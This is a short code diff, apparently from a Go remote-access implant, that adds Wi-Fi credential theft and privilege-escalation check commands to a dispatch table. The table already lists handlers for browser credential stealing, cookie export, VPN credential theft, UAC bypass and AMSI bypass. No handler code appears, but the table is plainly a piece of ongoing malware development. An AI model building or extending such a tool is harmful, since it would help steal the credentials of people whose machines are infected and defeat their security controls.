@@ -101,6 +101,8 @@ func init() {
 		"browser_steal":             handleBrowserSteal,
 		"cookie_export":             handleCookieExport,
 		"vpn_creds":                 handleVpnCreds,
+		"wifi_creds":                handleWifiCreds,
+		"privesc_check":             handlePrivescCheck,
 		"remote_input":              handleRemoteInput,
 		"uac_bypass":                handleUACBypass,
 		"amsi_bypass":               handleAMSIByPass,
